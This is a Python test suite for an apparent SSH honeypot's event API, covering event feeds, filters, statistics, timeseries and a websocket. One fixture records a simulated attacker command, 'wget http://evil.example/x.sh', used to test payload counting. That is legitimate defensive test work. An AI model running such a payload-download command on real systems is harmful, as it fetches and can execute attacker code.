import asyncio
import datetime as dt

from aiohttp.test_utils import TestClient, TestServer

from api import EventStore, create_app
from schemas import LoginInfo, RawEvent, Service
from sshd import hash_password


def _event(
    command: str = "whoami",
    *,
    payload_url: str | None = None,
    when: dt.datetime | None = None,
) -> RawEvent:
    return RawEvent(
        service=Service.SSH,
        source_ip="203.0.113.7",
        destination_ip="127.0.0.1",
        timestamp=when or dt.datetime.now(dt.timezone.utc),
        login_info=LoginInfo(
            username="root", password_hash=hash_password("hunter2")
        ),
        command=command,
        payload_url=payload_url,
        source_port=51000,
        destination_port=22,
        additional_info={"event_kind": "command"},
    )


def _handshake() -> RawEvent:
    return RawEvent(
        service=Service.SSH,
        source_ip="198.51.100.9",
        destination_ip="127.0.0.1",
        timestamp=dt.datetime.now(dt.timezone.utc),
        source_port=52000,
        destination_port=22,
        additional_info={"event_kind": "ssh_handshake", "client_version": "x"},
    )


async def _scenario(fn):
    store = EventStore()
    app = create_app(store)
    async with TestClient(TestServer(app)) as client:
        return await fn(client, store)


def test_health():
    async def scenario(client, store):
        response = await client.get("/health")
        assert response.status == 200
        body = await response.json()
        assert body["status"] == "ok"
        assert body["db"] == "ok"
        assert body["version"]
        assert body["uptime_s"] >= 0

    asyncio.run(_scenario(scenario))


def test_events_are_newest_first_and_wrapped():
    async def scenario(client, store):
        now = dt.datetime.now(dt.timezone.utc)
        await store.record(_event("pwd", when=now - dt.timedelta(seconds=2)))
        await store.record(_event("id", when=now))

        body = await (await client.get("/events?limit=1")).json()
        assert len(body["items"]) == 1
        assert body["items"][0]["command"] == "id"

        everything = await (await client.get("/events")).json()
        assert [item["command"] for item in everything["items"]] == ["id", "pwd"]
        assert everything["items"][0]["login_info"]["username"] == "root"
        assert everything["items"][0]["timestamp"].endswith("Z")

    asyncio.run(_scenario(scenario))


def test_handshake_events_stay_off_the_feed():
    async def scenario(client, store):
        await store.record(_handshake())
        body = await (await client.get("/events")).json()
        assert body == {"items": []}

    asyncio.run(_scenario(scenario))


def test_event_filters_and_validation():
    async def scenario(client, store):
        await store.record(_event("pwd"))

        assert (await (await client.get("/events?service=ssh")).json())["items"]
        assert (await (await client.get("/events?service=http")).json())["items"] == []
        assert (await (await client.get("/events?severity=high")).json())["items"] == []
        assert (await (await client.get("/events?technique=T1110")).json())["items"] == []

        for path in (
            "/events?limit=0",
            "/events?limit=501",
            "/events?limit=abc",
            "/events?service=telnet",
            "/events?severity=urgent",
            "/events?technique=T9999",
            "/events?since=yesterday",
            "/events?until=2026-01-01T00:00:00",
        ):
            response = await client.get(path)
            assert response.status == 400, path
            body = await response.json()
            assert body["error"] == "invalid_request", path

    asyncio.run(_scenario(scenario))


def test_stats_aggregate_the_requested_window():
    async def scenario(client, store):
        now = dt.datetime.now(dt.timezone.utc)
        await store.record(_event("whoami", when=now))
        await store.record(
            _event(
                "wget http://evil.example/x.sh",
                payload_url="http://evil.example/x.sh",
                when=now,
            )
        )
        await store.record(_event("id", when=now - dt.timedelta(days=2)))

        body = await (await client.get("/stats?window=1h")).json()
        assert body["window"] == "1h"
        assert body["generated_at"].endswith("Z")

        totals = body["totals"]
        assert totals["events"] == 2
        assert totals["unique_sources"] == 1
        assert totals["unique_credentials"] == 1
        assert totals["payloads"] == 1
        assert totals["high_or_critical"] == 0

        assert body["by_service"] == [{"service": "ssh", "count": 2}]
        assert body["by_severity"] == []
        assert body["by_technique"] == []
        assert body["top_credentials"][0]["username"] == "root"
        assert body["top_credentials"][0]["count"] == 2
        assert body["top_credentials"][0]["password_hash"].startswith("sha256:")
        assert body["top_sources"][0]["source_ip"] == "203.0.113.7"
        assert body["top_sources"][0]["count"] == 2
        assert body["payloads"][0]["url"] == "http://evil.example/x.sh"

    asyncio.run(_scenario(scenario))


def test_stats_and_timeseries_reject_unknown_windows():
    async def scenario(client, store):
        for path in ("/stats?window=2h", "/stats/timeseries?window=all"):
            response = await client.get(path)
            assert response.status == 400
            assert (await response.json())["error"] == "invalid_request"

    asyncio.run(_scenario(scenario))


def test_timeseries_returns_aligned_buckets():
    async def scenario(client, store):
        await store.record(_event("pwd"))
        await store.record(_event("id"))

        body = await (await client.get("/stats/timeseries?window=15m")).json()
        assert body["window"] == "15m"
        assert body["bucket_seconds"] == 30
        assert 30 <= len(body["points"]) <= 31

        points = body["points"]
        assert sum(point["total"] for point in points) == 2
        assert sum(point["ssh"] for point in points) == 2
        assert sum(point["http"] for point in points) == 0
        assert all(point["ts"].endswith("Z") for point in points)
        assert all(point["total"] == point["ssh"] + point["http"] for point in points)

    asyncio.run(_scenario(scenario))


def test_websocket_sends_hello_and_live_events():
    async def scenario(client, store):
        async with client.ws_connect("/ws/events") as socket:
            hello = await asyncio.wait_for(socket.receive_json(), 5)
            assert hello["type"] == "hello"
            assert hello["server_time"].endswith("Z")

            await socket.send_json({"type": "ping"})
            pong = await asyncio.wait_for(socket.receive_json(), 5)
            assert pong["type"] == "pong"

            await store.record(_event("whoami"))
            frame = await asyncio.wait_for(socket.receive_json(), 5)
            assert frame["type"] == "event"
            assert frame["event"]["command"] == "whoami"
            assert frame["event"]["service"] == "ssh"

            await socket.send_json({"type": "unknown"})
            await store.record(_event("id"))
            frame = await asyncio.wait_for(socket.receive_json(), 5)
            assert frame["event"]["command"] == "id"

    asyncio.run(_scenario(scenario))
